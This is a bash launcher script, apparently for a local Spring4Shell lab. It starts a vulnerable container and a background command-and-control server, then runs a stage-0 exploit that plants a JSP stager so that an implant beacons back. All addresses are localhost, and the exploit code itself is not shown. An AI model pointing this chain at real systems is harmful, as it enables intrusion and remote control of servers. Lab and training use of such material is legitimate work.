#!/usr/bin/env bash
# ------------------------------------------------------------------
# Convenience launcher – spins everything for the demo
#
# Intended for **local-lab only**.
# ------------------------------------------------------------------

# Exit on any error
set -euo pipefail

#execute from project root since we start from scripts folder
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR/.."

# Config
#URL of the vuln Spring4Shell web app 
TARGET_URL="http://127.0.0.1:8080"

#URL of your C2 server
C2_API="http://127.0.0.1:8000"

# Path to exploit skeleton
STAGE0_SCRIPT="../exploit/stage0_exploit.py"

#specify a single service name to start if desired. Overrides default
LAB_SERVICE=""

#start vulnerable lab container(s)
echo "[+] Starting lab container(s)..."
if [[ -n "$LAB_SERVICE" ]]; then
  docker-compose up -d "$LAB_SERVICE"
else
  docker-compose up -d
fi

echo "[+] Waiting for lab to be ready (10s)..."
sleep 10

#Launch C2 server 
echo "[+] Starting C2 server..."
#Run in background. Log to file under c2/logs
mkdir -p ../c2/logs
nohup python3 -m c2.c2_server > ../c2/logs/c2_stdout.log 2>&1 &
C2_PID=$!
echo "    C2 PID: $C2_PID"

echo "[+] Waiting for C2 to bind (5s)..."
sleep 5

#deploy & trigger JSP stager
echo "[+] Deploying and triggering payload.jsp stager..."
python3 "$STAGE0_SCRIPT" "$TARGET_URL" "$C2_API"

# Done
echo "[+] run_all.sh complete. Implant should be beaconing to C2."}